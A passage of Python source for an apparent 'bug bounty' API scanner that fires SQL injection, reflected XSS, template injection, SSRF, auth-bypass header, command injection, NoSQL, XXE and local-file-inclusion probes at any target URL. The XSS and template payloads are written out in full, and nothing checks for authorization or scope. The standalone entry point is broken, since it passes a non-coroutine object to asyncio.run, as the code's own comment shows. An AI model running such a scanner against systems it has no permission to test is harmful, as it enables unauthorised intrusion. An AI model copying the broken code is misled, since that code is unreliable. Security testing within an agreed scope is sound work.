                        continue
                    
                    baseline_content = await baseline_resp.text()
                    baseline_has_errors = any(re.search(pattern, baseline_content, re.IGNORECASE) 
                                            for pattern in sql_error_patterns)
                    
                    if baseline_has_errors:
                        continue  # Skip if baseline already has SQL errors
                    
                    for payload in payloads[:5]:
                        test_url = f"{endpoint}?{param}={quote(payload)}"
                        
                        # Time-based detection for SLEEP/DELAY payloads
                        if any(keyword in payload.upper() for keyword in ['SLEEP', 'WAITFOR', 'DELAY']):
                            start = time.time()
                            try:
                                async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                                    elapsed = time.time() - start
                                    
                                    # Very strict timing - must be consistent
                                    if elapsed > 4.8:  # More strict than 4.5
                                        # Verify with different timing
                                        verify_payload = payload.replace('5', '3')  # Change sleep time
                                        verify_url = f"{endpoint}?{param}={quote(verify_payload)}"
                                        
                                        start2 = time.time()
                                        async with self.session.get(verify_url, timeout=aiohttp.ClientTimeout(total=8)) as verify_resp:
                                            elapsed2 = time.time() - start2
                                            
                                            # Should be ~3 seconds if real SQL injection
                                            if 2.8 <= elapsed2 <= 3.5:
                                                findings.append({
                                                    'type': 'SQL_INJECTION',
                                                    'subtype': 'Time-based Blind',
                                                    'endpoint': endpoint,
                                                    'parameter': param,
                                                    'payload': payload,
                                                    'severity': 'CRITICAL',
                                                    'confidence': 'HIGH',
                                                    'evidence': f'Consistent timing delays: {elapsed:.1f}s and {elapsed2:.1f}s'
                                                })
                                                return findings
                                                
                            except asyncio.TimeoutError:
                                # Timeout can also indicate SQL injection
                                elapsed = time.time() - start
                                if elapsed > 8:  # Definitely timed out due to sleep
                                    findings.append({
                                        'type': 'SQL_INJECTION',
                                        'subtype': 'Time-based Blind (Timeout)',
                                        'endpoint': endpoint,
                                        'parameter': param,
                                        'payload': payload,
                                        'severity': 'CRITICAL',
                                        'confidence': 'MEDIUM',
                                        'evidence': f'Request timed out after {elapsed:.1f}s'
                                    })
                                    return findings
                        
                        # Error-based detection
                        else:
                            async with self.session.get(test_url) as response:
                                if response.status in [200, 500]:
                                    content = await response.text()
                                    
                                    # Check for SQL errors that weren't in baseline
                                    for error_pattern in sql_error_patterns:
                                        error_match = re.search(error_pattern, content, re.IGNORECASE)
                                        if error_match:
                                            # Make sure this specific error wasn't in baseline
                                            if not re.search(error_pattern, baseline_content, re.IGNORECASE):
                                                findings.append({
                                                    'type': 'SQL_INJECTION',
                                                    'subtype': 'Error-based',
                                                    'endpoint': endpoint,
                                                    'parameter': param,
                                                    'payload': payload,
                                                    'severity': 'CRITICAL',
                                                    'confidence': 'HIGH',
                                                    'evidence': f'SQL error: {error_match.group()}'
                                                })
                                                return findings
                        
                        await asyncio.sleep(0.3)  # Longer delay to be respectful
                            
            except Exception as e:
                continue
        
        return findings
  
    def is_payload_safe_context(self, content: str, payload: str) -> bool:
        """
        Check if XSS payload is in a safe context (encoded or in comments)
        """
        import re
        
        # Find the position of the payload
        payload_pos = content.find(payload)
        if payload_pos == -1:
            return True  # Not found, safe
        
        # Check if it's inside HTML comments
        comment_start = content.rfind('<!--', 0, payload_pos)
        comment_end = content.find('-->', payload_pos)
        if comment_start != -1 and comment_end != -1:
            return True  # Inside comment, safe
        
        # Check if it's properly encoded
        encoded_versions = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('<', '%3C').replace('>', '%3E'),
            payload.replace('"', '&quot;').replace("'", '&#x27;')
        ]
        
        for encoded in encoded_versions:
            if encoded in content:
                return True  # Properly encoded, safe
        
        return False  # Potentially unsafe

    async def test_ssti_improved(self, endpoint: str) -> List[Dict]:
        """
        IMPROVED SSTI Detection - Much more strict to avoid false positives
        """
        findings = []
        
        # More unique mathematical expressions
        ssti_tests = [
            # Template syntax with unique math
            ("{{7*7*7}}", "343"),        # More unique than 49
            ("{{9*9*9}}", "729"),        # Very unlikely to appear naturally
            ("${8*8*8}", "512"),         # Different syntax
            ("<%=6*6*6%>", "216"),       # JSP/ASP syntax
            
            # Multiple verification tests
            ("{{42*13}}", "546"),        # Very specific calculation
            ("{{1337-1300}}", "37"),     # Unique numbers
        ]
        
        params = ['template', 'name', 'msg', 'content', 'text', 'data']
        
        for payload, expected_result in ssti_tests:
            for param in params[:3]:  # Limit to most common
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    # Baseline first - CRITICAL
                    baseline_url = f"{endpoint}?{param}=normaltext"
                    async with self.session.get(baseline_url) as baseline_resp:
                        if baseline_resp.status != 200:
                            continue
                        baseline_content = await baseline_resp.text()
                    
                    # Test with payload
                    async with self.session.get(test_url) as response:
                        if response.status != 200:
                            continue
                            
                        content = await response.text()
                        
                        # STRICT VERIFICATION:
                        # 1. Expected result MUST be in response
                        # 2. Original payload MUST NOT be in response (was executed)
                        # 3. Result MUST NOT be in baseline (proves calculation happened)
                        # 4. Context check - result shouldn't be part of larger number
                        
                        if (expected_result in content and 
                            payload not in content and
                            expected_result not in baseline_content):
                            
                            # Context verification - avoid false positives
                            # Check if result is standalone number, not part of larger string
                            import re
                            
                            # Look for the result as standalone number
                            pattern = rf'\b{re.escape(expected_result)}\b'
                            if re.search(pattern, content):
                                # Double verification with different payload
                                verify_payload = f"{{{{11*11*11}}}}"  # Should give 1331
                                verify_url = f"{endpoint}?{param}={quote(verify_payload)}"
                                
                                async with self.session.get(verify_url) as verify_resp:
                                    if verify_resp.status == 200:
                                        verify_content = await verify_resp.text()
                                        
                                        if "1331" in verify_content and verify_payload not in verify_content:
                                            findings.append({
                                                'type': 'SSTI',
                                                'endpoint': endpoint,
                                                'parameter': param,
                                                'payload': payload,
                                                'verification_payload': verify_payload,
                                                'severity': 'CRITICAL',
                                                'confidence': 'HIGH',
                                                'evidence': f'Template executed: {payload} = {expected_result}, verified with 11^3 = 1331'
                                            })
                                            return findings
                            
                except Exception as e:
                    continue
                
                await asyncio.sleep(0.2)
        
        return findings

    async def test_xss_improved(self, endpoint: str) -> List[Dict]:
        """
        IMPROVED XSS Detection - Much more strict
        """
        findings = []
        
        # More unique XSS payloads
        xss_tests = [
            # Unique strings unlikely to appear naturally
            "<script>alert('XSS_TEST_12345')</script>",
            "<img src=x onerror=alert('UNIQUE_XSS_789')>",
            "<svg onload=alert('CONFIRM_XSS_999')>",
            "javascript:alert('VERIFY_XSS_456')",
            "'\"><script>alert('NESTED_XSS_321')</script>",
        ]
        
        params = ['q', 'search', 'query', 'keyword', 'name', 'comment', 'message']
        
        for payload in xss_tests:
            # Extract the unique identifier from payload
            unique_id = None
            if 'XSS_TEST_12345' in payload:
                unique_id = 'XSS_TEST_12345'
            elif 'UNIQUE_XSS_789' in payload:
                unique_id = 'UNIQUE_XSS_789'
            # ... etc
            
            for param in params[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    # Baseline check
                    baseline_url = f"{endpoint}?{param}=normaltext"
                    async with self.session.get(baseline_url) as baseline_resp:
                        if baseline_resp.status != 200:
                            continue
                        baseline_content = await baseline_resp.text()
                    
                    async with self.session.get(test_url) as response:
                        if response.status != 200:
                            continue
                            
                        content = await response.text()
                        content_type = response.headers.get('Content-Type', '').lower()
                        
                        # STRICT XSS VERIFICATION:
                        # 1. Payload must be reflected in HTML context (not JSON)
                        # 2. Must not be properly encoded
                        # 3. Must be in potentially executable context
                        
                        if ('text/html' in content_type and 
                            payload in content and
                            payload not in baseline_content):
                            
                            # Check if it's in executable context
                            # Look for the payload outside of HTML comments or text nodes
                            if not self.is_payload_safe_context(content, payload):
                                
                                # Double verification with different payload
                                verify_payload = "<script>alert('VERIFY_12321')</script>"
                                verify_url = f"{endpoint}?{param}={quote(verify_payload)}"
                                
                                async with self.session.get(verify_url) as verify_resp:
                                    if (verify_resp.status == 200 and 
                                        'text/html' in verify_resp.headers.get('Content-Type', '').lower()):
                                        verify_content = await verify_resp.text()
                                        
                                        if verify_payload in verify_content:
                                            findings.append({
                                                'type': 'XSS',
                                                'subtype': 'Reflected',
                                                'endpoint': endpoint,
                                                'parameter': param,
                                                'payload': payload,
                                                'severity': 'HIGH',
                                                'confidence': 'HIGH',
                                                'evidence': 'Payload reflected in HTML without encoding, verified with secondary payload'
                                            })
                                            return findings
                            
                except Exception as e:
                    continue
                
                await asyncio.sleep(0.2)
        
        return findings

    async def test_ssrf(self, endpoint: str) -> List[Dict]:
        """Test Server-Side Request Forgery"""
        findings = []
        payloads = self.payloads.get('ssrf')
        
        params = ['url', 'uri', 'path', 'dest', 'redirect']
        
        for param in params[:3]:
            for payload in payloads[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    async with self.session.get(test_url, timeout=8) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check for internal data
                            indicators = ['root:', 'daemon:', 'localhost', 'metadata']
                            
                            for indicator in indicators:
                                if indicator in content:
                                    findings.append({
                                        'type': 'SSRF',
                                        'endpoint': endpoint,
                                        'parameter': param,
                                        'payload': payload,
                                        'severity': 'CRITICAL',
                                        'confidence': 'HIGH',
                                        'evidence': f'Internal data leaked: {indicator}'
                                    })
                                    return findings
                except:
                    pass
        
        return findings
    
    async def test_auth_bypass(self, endpoint: str) -> List[Dict]:
        """Test Authentication Bypass"""
        findings = []
        headers = self.payloads.get('auth_bypass_headers')
        
        for header_line in headers[:10]:
            if ':' in header_line:
                header_name, header_value = header_line.split(':', 1)
                test_headers = {header_name.strip(): header_value.strip()}
                
                try:
                    # First get normal response
                    async with self.session.get(endpoint) as normal_resp:
                        normal_status = normal_resp.status
                        
                        # If normally forbidden/unauthorized
                        if normal_status in [401, 403]:
                            # Try with bypass header
                            async with self.session.get(endpoint, headers=test_headers) as response:
                                if response.status == 200:
                                    findings.append({
                                        'type': 'AUTH_BYPASS',
                                        'endpoint': endpoint,
                                        'technique': header_line,
                                        'severity': 'CRITICAL',
                                        'confidence': 'HIGH'
                                    })
                                    return findings
                except:
                    pass
        
        return findings
    
    async def test_command_injection(self, endpoint: str) -> List[Dict]:
        """Test Command Injection"""
        findings = []
        payloads = self.payloads.get('command_injection')
        
        params = ['cmd', 'exec', 'command', 'ping', 'host']
        
        for param in params[:3]:
            for payload in payloads[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    # Time-based detection
                    if 'sleep' in payload.lower():
                        start = time.time()
                        async with self.session.get(test_url) as response:
                            elapsed = time.time() - start
                            
                            if elapsed > 4.5:
                                findings.append({
                                    'type': 'COMMAND_INJECTION',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'CRITICAL',
                                    'confidence': 'HIGH',
                                    'evidence': f'Command executed (delay: {elapsed:.1f}s)'
                                })
                                return findings
                except:
                    pass
        
        return findings
   
    async def test_nosql_injection(self, endpoint: str) -> List[Dict]:
        """Test NoSQL Injection"""
        findings = []
        payloads = self.payloads.get('nosql_injection')
        
        for payload in payloads[:3]:
            try:
                headers = {'Content-Type': 'application/json'}
                async with self.session.post(endpoint, data=payload, headers=headers) as response:
                    if response.status in [200, 201]:
                        content = await response.text()
                        
                        if len(content) > 100 and 'error' not in content.lower():
                            findings.append({
                                'type': 'NOSQL_INJECTION',
                                'endpoint': endpoint,
                                'payload': payload,
                                'severity': 'HIGH',
                                'confidence': 'MEDIUM'
                            })
                            return findings
            except:
                pass
        
        return findings
    
    async def test_xxe(self, endpoint: str) -> List[Dict]:
        """Test XML External Entity"""
        findings = []
        payloads = self.payloads.get('xxe')
        
        for payload in payloads[:2]:
            try:
                headers = {'Content-Type': 'application/xml'}
                async with self.session.post(endpoint, data=payload, headers=headers) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for file content
                        if any(ind in content for ind in ['root:', 'daemon:', 'Windows']):
                            findings.append({
                                'type': 'XXE',
                                'endpoint': endpoint,
                                'severity': 'CRITICAL',
                                'confidence': 'HIGH',
                                'evidence': 'File contents disclosed'
                            })
                            return findings
            except:
                pass
        
        return findings
    
    async def test_lfi(self, endpoint: str) -> List[Dict]:
        """Test Local File Inclusion"""
        findings = []
        payloads = self.payloads.get('lfi')
        
        params = ['file', 'path', 'page', 'include', 'template']
        
        for param in params[:3]:
            for payload in payloads[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check for file content
                            if any(ind in content for ind in ['root:x:', 'daemon:', '[fonts]']):
                                findings.append({
                                    'type': 'LFI',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'HIGH',
                                    'confidence': 'HIGH',
                                    'evidence': 'Local file contents exposed'
                                })
                                return findings
                except:
                    pass
        
        return findings
    
    async def test_endpoint(self, endpoint: str) -> List[Dict]:
        """Run all tests on endpoint"""
        all_findings = []
        
        # Rate limiting
        await asyncio.sleep(0.1)
        
        # Run all tests
        tests = [
            self.test_sql_injection_improved(endpoint),
            self.test_xss_improved(endpoint),
            self.test_ssti_improved(endpoint),
            self.test_ssrf(endpoint),
            self.test_auth_bypass(endpoint),
            self.test_command_injection(endpoint),
            self.test_nosql_injection(endpoint),
            self.test_xxe(endpoint),
            self.test_lfi(endpoint)
        ]
        
        results = await asyncio.gather(*tests, return_exceptions=True)
        
        for result in results:
            if result and not isinstance(result, Exception):
                all_findings.extend(result)
        
        return all_findings
    
    async def scan(self) -> Dict:
        """Main scanning function - COMPLETELY FIXED"""
        await self.initialize()
        
        print("\n" + "="*60)
        print(" BUG BOUNTY API SECURITY SCANNER")
        print("="*60)
        print(f" Target: {self.target}")
        print(f" Aggression Level: {self.aggressive}/10")
        print("="*60 + "\n")
        
        try:
            # Phase 1: Discovery - FIXED function call
            print("[PHASE 1] Endpoint Discovery")
            endpoints = await self.discover_endpoints_comprehensive()  # FIXED: Use correct function name
            
            if not endpoints:
                print("  [!] No real API endpoints found, using base URL")
                endpoints = {self.target}
            else:
                print(f"  [+] Total real API endpoints: {len(endpoints)}")
                for endpoint_url in list(endpoints)[:5]:  # Show first 5
                    print(f"    - {endpoint_url}")
                if len(endpoints) > 5:
                    print(f"    ... and {len(endpoints) - 5} more")
            
            # Phase 2: Security Testing
            print("\n[PHASE 2] Security Testing")
            
            all_findings = []
            tested = 0
            
            for endpoint_url in list(endpoints):  # FIXED: Use descriptive variable name
                tested += 1
                print(f"  [{tested}/{len(endpoints)}] Testing: {endpoint_url}")
                
                findings = await self.test_endpoint(endpoint_url)  # FIXED: Use correct variable
                all_findings.extend(findings)
                
                # Early exit on critical findings
                critical = [f for f in all_findings if f.get('severity') == 'CRITICAL']
                if len(critical) >= 10:
                    print("\n  [!] 10+ CRITICAL vulnerabilities found - stopping scan")
                    break
            
            # Generate report
            self.generate_report(all_findings, len(endpoints), tested)
            
            return {
                'target': self.target,
                'endpoints_found': len(endpoints),
                'endpoints_tested': tested,
                'vulnerabilities': all_findings,
                'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
        except Exception as e:
            print(f"[ERROR] Scan failed: {e}")
            return {
                'target': self.target,
                'error': str(e),
                'endpoints_found': 0,
                'endpoints_tested': 0,
                'vulnerabilities': [],
                'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
        
        finally:
            # FIXED: Always close session
            if self.session and not self.session.closed:
                await self.session.close()
                print("[*] Session closed properly")

    def generate_report(self, findings: List[Dict], total_endpoints: int, tested: int):
        """Generate detailed final report"""
        
        # Categorize findings
        critical = [f for f in findings if f.get('severity') == 'CRITICAL']
        high = [f for f in findings if f.get('severity') == 'HIGH']
        medium = [f for f in findings if f.get('severity') == 'MEDIUM']
        low = [f for f in findings if f.get('severity') == 'LOW']
        
        print("\n" + "="*60)
        print(" SCAN RESULTS")
        print("="*60)
        print(f" Real API Endpoints Found: {total_endpoints}")
        print(f" Endpoints Tested: {tested}")
        print(f" Total Vulnerabilities: {len(findings)}")
        print("="*60)
        
        if critical:
            print(f"\n[CRITICAL] {len(critical)} vulnerabilities:")
            for vuln in critical[:10]:
                print(f"  • {vuln['type']}: {vuln['endpoint'][:60]}")
                if 'evidence' in vuln:
                    print(f"    Evidence: {vuln['evidence']}")
        
        if high:
            print(f"\n[HIGH] {len(high)} vulnerabilities:")
            for vuln in high[:5]:
                print(f"  • {vuln['type']}: {vuln['endpoint'][:60]}")
        
        if medium:
            print(f"\n[MEDIUM] {len(medium)} vulnerabilities:")
            for vuln in medium[:5]:
                print(f"  • {vuln['type']}: {vuln['endpoint'][:60]}")
        
        if low:
            print(f"\n[LOW] {len(low)} vulnerabilities")
        
        print("\n" + "="*60)

# Main execution function - IMPORTANT: Same name as original module
def run_scanner_sync(target: str, threads: int = 30, aggressive: int = 8):
    """Run the bug bounty scanner - synchronous version"""
    async def run_async():
        scanner = BugBountyScanner(target, threads=threads, aggressive=aggressive)
        return await scanner.scan()
    
    return asyncio.run(run_async())

def run_scanner(target: str, threads: int = 30, aggressive: int = 8):
    """Run the bug bounty scanner - module interface"""
    scanner = BugBountyScanner(target, threads=threads, aggressive=aggressive)
    return scanner  # Return the scanner object, not a coroutine

if __name__ == "__main__":
    # Standalone execution
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python elite_api_hunter.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    asyncio.run(run_scanner(target))